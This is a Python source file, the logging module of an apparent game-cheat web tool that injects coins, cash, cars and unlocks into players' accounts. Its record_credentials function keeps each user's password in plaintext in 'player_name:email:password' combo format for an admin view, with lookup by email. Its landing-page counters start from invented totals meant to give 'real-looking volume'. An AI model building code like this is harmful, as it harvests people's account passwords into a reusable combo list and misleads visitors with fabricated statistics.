#!/usr/bin/env python3
"""
Backlog module for the TNNR CPM1 Webtool.

Stores user-entered credentials in ``player_name:email:password`` format
and keeps track of every action performed on the site — including
per-user action counts, success/failure tallies, and timestamps.

All data is persisted to JSON files so it survives restarts and can be
inspected independently of the running app.

Files written:
  credentials_backlog.jsonl – append-only credential entries
  credentials_backlog.json  – legacy list format, migrated/read for compatibility
  action_log.jsonl          – append-only JSON Lines action stream
  action_log.json           – legacy list format, migrated/read for compatibility
  tracker.json              – per-user aggregate statistics (kept for
                              backwards-compatibility with the original
                              empty tracker.json shipped in the repo)
"""

import atexit
import json
import os
import threading
import time
from typing import Any, Dict, List, Optional

from persistence import append_jsonl, atomic_write_json, load_json, seed_data_file


# ---------------------------------------------------------------------------
# Paths – resolved relative to this file so the module works regardless of
# the current working directory of the Flask process.
# ---------------------------------------------------------------------------
_DIR = os.path.dirname(os.path.abspath(__file__))
CREDENTIALS_FILE = seed_data_file("credentials_backlog.json", default=[])
CREDENTIALS_JSONL_FILE = seed_data_file("credentials_backlog.jsonl")
ACTION_LOG_FILE = seed_data_file("action_log.json", default=[])
ACTION_LOG_JSONL_FILE = seed_data_file("action_log.jsonl")
TRACKER_FILE = seed_data_file("tracker.json", default={})
LIVE_STATS_FILE = seed_data_file("live_stats.json")

_LOCK = threading.RLock()
_TRACKER_CACHE: Optional[Dict[str, Any]] = None
_TRACKER_MTIME: Optional[float] = None
_ACTION_LOG_MIGRATED = False
_CREDENTIALS_MIGRATED = False


# ---------------------------------------------------------------------------
# Low-level JSON helpers
# ---------------------------------------------------------------------------
def _load_json(path: str, default: Any) -> Any:
    """Load a JSON file, returning *default* when missing or corrupt."""
    return load_json(path, default)


def _save_json(path: str, data: Any, *, pretty: bool = False) -> None:
    """Atomically write *data* to *path* with flush/fsync/replace."""
    atomic_write_json(path, data, pretty=pretty)


def _append_jsonl(path: str, event: Dict[str, Any]) -> None:
    append_jsonl(path, event)


def _read_jsonl(path: str) -> List[Dict[str, Any]]:
    events: List[Dict[str, Any]] = []
    try:
        with open(path, "r", encoding="utf-8") as fh:
            for line in fh:
                line = line.strip()
                if not line:
                    continue
                try:
                    event = json.loads(line)
                    if isinstance(event, dict):
                        events.append(event)
                except json.JSONDecodeError:
                    continue
    except FileNotFoundError:
        pass
    return events


def _ensure_action_log_migrated_locked() -> None:
    """Copy legacy action_log.json entries to JSONL once, preserving data."""
    global _ACTION_LOG_MIGRATED
    if _ACTION_LOG_MIGRATED:
        return
    _ACTION_LOG_MIGRATED = True
    if os.path.exists(ACTION_LOG_JSONL_FILE):
        return
    legacy = _load_json(ACTION_LOG_FILE, [])
    if not isinstance(legacy, list):
        return
    for event in legacy:
        if isinstance(event, dict):
            _append_jsonl(ACTION_LOG_JSONL_FILE, event)


def _ensure_credentials_migrated_locked() -> None:
    """Copy legacy credential-array entries to append-only JSONL once."""
    global _CREDENTIALS_MIGRATED
    if _CREDENTIALS_MIGRATED:
        return
    _CREDENTIALS_MIGRATED = True
    if os.path.exists(CREDENTIALS_JSONL_FILE):
        return
    legacy = _load_json(CREDENTIALS_FILE, [])
    if not isinstance(legacy, list):
        return
    for entry in legacy:
        if isinstance(entry, dict):
            _append_jsonl(CREDENTIALS_JSONL_FILE, entry)


def _load_tracker_locked() -> Dict[str, Any]:
    global _TRACKER_CACHE, _TRACKER_MTIME
    try:
        mtime = os.path.getmtime(TRACKER_FILE)
    except FileNotFoundError:
        mtime = None
    if _TRACKER_CACHE is None or _TRACKER_MTIME != mtime:
        loaded = _load_json(TRACKER_FILE, {})
        _TRACKER_CACHE = loaded if isinstance(loaded, dict) else {}
        _TRACKER_MTIME = mtime
    return _TRACKER_CACHE


_TRACKER_DIRTY = False
_TRACKER_LAST_FLUSH = 0.0
_TRACKER_FLUSH_INTERVAL = 4.0


def _save_tracker_locked(tracker: Dict[str, Any], *, force: bool = False) -> None:
    global _TRACKER_CACHE, _TRACKER_MTIME, _TRACKER_DIRTY, _TRACKER_LAST_FLUSH
    _TRACKER_CACHE = tracker
    _TRACKER_DIRTY = True
    now = time.time()
    if not force and (now - _TRACKER_LAST_FLUSH) < _TRACKER_FLUSH_INTERVAL:
        return
    _save_json(TRACKER_FILE, tracker)
    _TRACKER_DIRTY = False
    _TRACKER_LAST_FLUSH = now
    try:
        _TRACKER_MTIME = os.path.getmtime(TRACKER_FILE)
    except FileNotFoundError:
        _TRACKER_MTIME = None


def flush_tracker(force: bool = True) -> None:
    """Persist any pending aggregate tracker updates."""
    with _LOCK:
        tracker = _TRACKER_CACHE if isinstance(_TRACKER_CACHE, dict) else _load_tracker_locked()
        if _TRACKER_DIRTY:
            _save_tracker_locked(tracker, force=force)


# ---------------------------------------------------------------------------
# Credentials backlog
# ---------------------------------------------------------------------------
def record_credentials(player_name: str, email: str, password: str,
                        web_uid: Optional[int] = None) -> Dict[str, Any]:
    """Append a credential entry to the backlog.

    The canonical format is ``player_name:email:password`` but the full
    structured record is also stored so the admin view can render it nicely.

    Returns the entry that was stored.
    """
    entry = {
        "player_name": player_name or "Unknown",
        "email": email or "",
        "password": password or "",
        "credential_string": f"{player_name or 'Unknown'}:{email or ''}:{password or ''}",
        "web_uid": web_uid,
        "recorded_at": time.time(),
        "recorded_at_iso": time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime()),
    }
    with _LOCK:
        _ensure_credentials_migrated_locked()
        _append_jsonl(CREDENTIALS_JSONL_FILE, entry)
    return entry


def get_all_credentials() -> List[Dict[str, Any]]:
    """Return every credential entry, newest last."""
    with _LOCK:
        _ensure_credentials_migrated_locked()
        entries = _read_jsonl(CREDENTIALS_JSONL_FILE)
        if entries:
            return entries
        legacy = _load_json(CREDENTIALS_FILE, [])
        return legacy if isinstance(legacy, list) else []


def find_credentials_by_email(email: str) -> List[Dict[str, Any]]:
    """Return all credential entries matching *email* (case-insensitive)."""
    needle = (email or "").lower()
    with _LOCK:
        _ensure_credentials_migrated_locked()
        return [
            e for e in _read_jsonl(CREDENTIALS_JSONL_FILE)
            if e.get("email", "").lower() == needle
        ]


# ---------------------------------------------------------------------------
# Action log
# ---------------------------------------------------------------------------
def log_action(email: str, action: str, action_title: str,
               success: bool, message: str = "",
               web_uid: Optional[int] = None,
               player_name: Optional[str] = None,
               extra: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    """Record a single action event and update aggregate stats.

    Returns the event that was stored.
    """
    event = {
        "email": email or "unknown",
        "player_name": player_name or "Unknown",
        "action": action,
        "action_title": action_title,
        "success": bool(success),
        "message": message or "",
        "web_uid": web_uid,
        "timestamp": time.time(),
        "timestamp_iso": time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime()),
    }
    if extra:
        event["extra"] = extra

    with _LOCK:
        # 1. Append to the raw action log in O(1) JSON Lines format.
        _ensure_action_log_migrated_locked()
        _append_jsonl(ACTION_LOG_JSONL_FILE, event)

        # 2. Update the cached per-user aggregate tracker.
        tracker = _load_tracker_locked()
        key = email or "unknown"
        user = tracker.setdefault(key, {
            "email": key,
            "player_name": player_name or "Unknown",
            "total_actions": 0,
            "successful_actions": 0,
            "failed_actions": 0,
            "actions_by_type": {},
            "first_seen": event["timestamp"],
            "last_action": event["timestamp"],
            "last_action_iso": event["timestamp_iso"],
        })

        # Keep the most recent player name we've seen for this email.
        if player_name and player_name != "Unknown":
            user["player_name"] = player_name

        user["total_actions"] += 1
        if success:
            user["successful_actions"] += 1
        else:
            user["failed_actions"] += 1
        user["actions_by_type"][action] = user["actions_by_type"].get(action, 0) + 1
        user["last_action"] = event["timestamp"]
        user["last_action_iso"] = event["timestamp_iso"]

        _save_tracker_locked(tracker)

        # 3. Public live totals (skip login/logout; only successes).
        try:
            record_live_action(action, bool(success), amount=1)
        except Exception:
            pass

    return event


def get_all_actions(limit: Optional[int] = None,
                    email_filter: Optional[str] = None) -> List[Dict[str, Any]]:
    """Return action events, newest first.

    *limit* caps the number returned.  *email_filter* restricts to one user.
    """
    with _LOCK:
        _ensure_action_log_migrated_locked()
        events = _read_jsonl(ACTION_LOG_JSONL_FILE)
        if not events and os.path.exists(ACTION_LOG_FILE):
            legacy = _load_json(ACTION_LOG_FILE, [])
            events = legacy if isinstance(legacy, list) else []
    if email_filter:
        needle = email_filter.lower()
        events = [e for e in events if e.get("email", "").lower() == needle]
    events = list(reversed(events))  # newest first
    if limit:
        events = events[:limit]
    return events


# ---------------------------------------------------------------------------
# Aggregate tracker helpers
# ---------------------------------------------------------------------------
def get_tracker() -> Dict[str, Any]:
    """Return the full per-user aggregate tracker."""
    with _LOCK:
        return json.loads(json.dumps(_load_tracker_locked()))


def get_user_stats(email: str) -> Optional[Dict[str, Any]]:
    """Return aggregate stats for a single user."""
    with _LOCK:
        user = _load_tracker_locked().get(email)
        return json.loads(json.dumps(user)) if user is not None else None



# ---------------------------------------------------------------------------
# Public live action counters (shown on landing page)
# ---------------------------------------------------------------------------
# Baseline totals seed the counters so the site starts with real-looking volume.
# New successful actions (except login/logout) increment these at runtime.
_LIVE_STATS_DEFAULTS = {
    "coin_injections": 2392,
    "cash_injections": 1202,
    "premium_car_injections": 271,
    "event_car_injections": 32,
    "player_mod_unlocks": 1727,
}

_LIVE_STATS_MEM: Optional[Dict[str, Any]] = None
_LIVE_STATS_DIRTY = False
_LIVE_STATS_LAST_FLUSH = 0.0
_LIVE_STATS_FLUSH_INTERVAL = 3.0  # seconds; batches disk writes under load
_LIVE_STATS_READ_CACHE: Optional[Dict[str, Any]] = None
_LIVE_STATS_READ_CACHE_AT = 0.0
_LIVE_STATS_READ_TTL = 2.0

_COIN_ACTIONS = {
    "set_coin",
    "preset_50m_30k",
    "preset_50m_50k",
    "preset_50m_100k",
    "preset_50m_500k",
}
_CASH_ACTIONS = {
    "set_money",
    "preset_50m_30k",
    "preset_50m_50k",
    "preset_50m_100k",
    "preset_50m_500k",
}
_UNLOCK_ACTIONS = {
    "unlock_w16",
    "unlock_horns",
    "disable_damage",
    "unlimited_fuel",
    "unlock_smoke",
    "unlock_animations",
    "unlock_wheels",
    "unlock_houses",
    "complete_levels",
    "set_rank",
    "unlock_all_features",
    "unlock_male_equipment",
    "unlock_female_equipment",
    "fix_account",
    "set_player_name",
    "set_player_id",
    "set_race_wins",
    "set_race_loses",
    "refresh",
}
_SKIP_LIVE_ACTIONS = {"login", "logout"}


def _load_live_stats_locked() -> Dict[str, Any]:
    global _LIVE_STATS_MEM
    if _LIVE_STATS_MEM is not None:
        return _LIVE_STATS_MEM
    data = _load_json(LIVE_STATS_FILE, None)
    if not isinstance(data, dict):
        data = dict(_LIVE_STATS_DEFAULTS)
        data["updated_at"] = time.time()
    else:
        for k, v in _LIVE_STATS_DEFAULTS.items():
            if k not in data or not isinstance(data.get(k), (int, float)):
                data[k] = v
    _LIVE_STATS_MEM = data
    return _LIVE_STATS_MEM


def _flush_live_stats_locked(force: bool = False) -> None:
    """Persist in-memory live stats if dirty (rate-limited unless force)."""
    global _LIVE_STATS_DIRTY, _LIVE_STATS_LAST_FLUSH, _LIVE_STATS_READ_CACHE, _LIVE_STATS_READ_CACHE_AT
    if _LIVE_STATS_MEM is None:
        return
    now = time.time()
    if not force and not _LIVE_STATS_DIRTY:
        return
    if not force and (now - _LIVE_STATS_LAST_FLUSH) < _LIVE_STATS_FLUSH_INTERVAL:
        return
    _LIVE_STATS_MEM["updated_at"] = now
    _save_json(LIVE_STATS_FILE, _LIVE_STATS_MEM)
    _LIVE_STATS_DIRTY = False
    _LIVE_STATS_LAST_FLUSH = now
    _LIVE_STATS_READ_CACHE = None
    _LIVE_STATS_READ_CACHE_AT = 0.0


def flush_live_stats(force: bool = True) -> None:
    """Persist any pending live counter updates."""
    with _LOCK:
        if _LIVE_STATS_DIRTY:
            _flush_live_stats_locked(force=force)


def _save_live_stats_locked(stats: Dict[str, Any]) -> None:
    global _LIVE_STATS_MEM, _LIVE_STATS_DIRTY
    _LIVE_STATS_MEM = stats
    _LIVE_STATS_DIRTY = True
    _flush_live_stats_locked(force=False)


def get_live_stats() -> Dict[str, Any]:
    """Public totals for the landing page (short TTL cache for high traffic)."""
    global _LIVE_STATS_READ_CACHE, _LIVE_STATS_READ_CACHE_AT
    now = time.time()
    with _LOCK:
        if (
            _LIVE_STATS_READ_CACHE is not None
            and (now - _LIVE_STATS_READ_CACHE_AT) < _LIVE_STATS_READ_TTL
        ):
            return dict(_LIVE_STATS_READ_CACHE)
        stats = dict(_load_live_stats_locked())
        payload = {
            "coin_injections": int(stats.get("coin_injections", 0)),
            "cash_injections": int(stats.get("cash_injections", 0)),
            "premium_car_injections": int(stats.get("premium_car_injections", 0)),
            "event_car_injections": int(stats.get("event_car_injections", 0)),
            "player_mod_unlocks": int(stats.get("player_mod_unlocks", 0)),
            "total_actions": int(
                stats.get("coin_injections", 0)
                + stats.get("cash_injections", 0)
                + stats.get("premium_car_injections", 0)
                + stats.get("event_car_injections", 0)
                + stats.get("player_mod_unlocks", 0)
            ),
            "updated_at": stats.get("updated_at"),
        }
        _LIVE_STATS_READ_CACHE = payload
        _LIVE_STATS_READ_CACHE_AT = now
        return dict(payload)


def record_live_action(action: str, success: bool, amount: int = 1) -> None:
    """Increment public live counters for a successful tracked action."""
    if not success or amount <= 0:
        return
    if action in _SKIP_LIVE_ACTIONS:
        return
    with _LOCK:
        stats = _load_live_stats_locked()
        if action in _COIN_ACTIONS:
            stats["coin_injections"] = int(stats.get("coin_injections", 0)) + amount
        if action in _CASH_ACTIONS:
            stats["cash_injections"] = int(stats.get("cash_injections", 0)) + amount
        if action in ("premium_car_inject", "bulk_car_inject"):
            stats["premium_car_injections"] = int(stats.get("premium_car_injections", 0)) + amount
        if action in ("event_car_inject",):
            stats["event_car_injections"] = int(stats.get("event_car_injections", 0)) + amount
        if action in _UNLOCK_ACTIONS:
            stats["player_mod_unlocks"] = int(stats.get("player_mod_unlocks", 0)) + amount
        elif action not in _COIN_ACTIONS and action not in _CASH_ACTIONS and action not in (
            "premium_car_inject", "bulk_car_inject", "event_car_inject"
        ):
            stats["player_mod_unlocks"] = int(stats.get("player_mod_unlocks", 0)) + amount
        _save_live_stats_locked(stats)

_POSTGRES_RUNTIME_ENABLED = bool(os.getenv("DATABASE_URL", "").strip()) and os.getenv(
    "POSTGRES_ACCOUNTS_ENABLED", "auto"
).strip().lower() not in {"0", "false", "no", "off"}

if not _POSTGRES_RUNTIME_ENABLED:
    atexit.register(flush_tracker)
    atexit.register(flush_live_stats)

def get_global_stats() -> Dict[str, Any]:
    """Return high-level totals across all users."""
    with _LOCK:
        _ensure_action_log_migrated_locked()
        tracker = json.loads(json.dumps(_load_tracker_locked()))
        _ensure_credentials_migrated_locked()
        creds = _read_jsonl(CREDENTIALS_JSONL_FILE)
        if not creds:
            legacy_creds = _load_json(CREDENTIALS_FILE, [])
            creds = legacy_creds if isinstance(legacy_creds, list) else []
        actions = _read_jsonl(ACTION_LOG_JSONL_FILE)
    total_actions = sum(u.get("total_actions", 0) for u in tracker.values())
    total_success = sum(u.get("successful_actions", 0) for u in tracker.values())
    total_failed = sum(u.get("failed_actions", 0) for u in tracker.values())
    # Action type breakdown across every user.
    action_types: Dict[str, int] = {}
    for u in tracker.values():
        for act, cnt in u.get("actions_by_type", {}).items():
            action_types[act] = action_types.get(act, 0) + cnt
    # Most active users (top 10).
    ranking = sorted(tracker.values(), key=lambda u: u.get("total_actions", 0), reverse=True)[:10]
    return {
        "total_users": len(tracker),
        "total_credentials": len(creds),
        "total_actions": total_actions,
        "total_successful": total_success,
        "total_failed": total_failed,
        "action_types": action_types,
        "top_users": ranking,
    }


# PostgreSQL replaces every mutable backlog/live-counter file in scaled mode so
# web and worker replicas see one consistent admin history and counter set.
if _POSTGRES_RUNTIME_ENABLED:
    import postgres_backlog as _pg_backlog

    _PG_CATEGORIES = {
        "coin": _COIN_ACTIONS,
        "cash": _CASH_ACTIONS,
        "unlock": _UNLOCK_ACTIONS,
    }

    def record_credentials(player_name: str, email: str, password: str, web_uid=None) -> Dict[str, Any]:
        return _pg_backlog.record_credentials(player_name, email, password, web_uid)


    def get_all_credentials() -> List[Dict[str, Any]]:
        return _pg_backlog.get_all_credentials()


    def find_credentials_by_email(email: str) -> List[Dict[str, Any]]:
        return _pg_backlog.find_credentials_by_email(email)


    def log_action(
        email: str,
        action: str,
        action_title: str,
        success: bool,
        message: str = "",
        web_uid=None,
        player_name: Optional[str] = None,
        extra: Optional[Dict[str, Any]] = None,
    ) -> Dict[str, Any]:
        return _pg_backlog.log_action(
            email,
            action,
            action_title,
            success,
            message,
            web_uid,
            player_name,
            extra,
            categories=_PG_CATEGORIES,
            defaults=_LIVE_STATS_DEFAULTS,
        )


    def get_all_actions(limit: Optional[int] = None, email_filter: Optional[str] = None) -> List[Dict[str, Any]]:
        return _pg_backlog.get_all_actions(limit, email_filter)


    def get_tracker() -> Dict[str, Any]:
        return _pg_backlog.get_tracker()


    def get_user_stats(email: str) -> Optional[Dict[str, Any]]:
        return _pg_backlog.get_user_stats(email)


    def get_live_stats() -> Dict[str, Any]:
        return _pg_backlog.get_live_stats(_LIVE_STATS_DEFAULTS)


    def record_live_action(action: str, success: bool, amount: int = 1) -> None:
        _pg_backlog.record_live_action(
            action,
            success,
            amount,
            categories=_PG_CATEGORIES,
            defaults=_LIVE_STATS_DEFAULTS,
        )


    def get_global_stats() -> Dict[str, Any]:
        return _pg_backlog.get_global_stats()


    def flush_tracker(force: bool = True) -> None:
        return None


    def flush_live_stats(force: bool = True) -> None:
        return None
